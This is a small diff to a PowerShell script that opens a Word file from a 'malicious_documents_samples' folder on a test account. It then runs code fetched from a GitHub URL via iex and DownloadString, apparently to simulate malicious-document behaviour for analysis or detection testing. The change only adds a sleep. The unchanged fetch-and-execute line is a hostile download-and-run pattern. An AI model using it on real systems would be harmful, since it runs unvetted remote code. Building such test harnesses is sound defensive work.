@@ -5,4 +5,6 @@ Start-Process winword.exe C:\Users\IEUser\Downloads\malicious_documents_samples\
 Start-Sleep -Seconds 2
 iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/chriskossdummy/miscscripts/master/enable.ps1")
 
+Start-Sleep -Seconds 10
+
 Write-Output "Goodbye World -- remote execution complete"
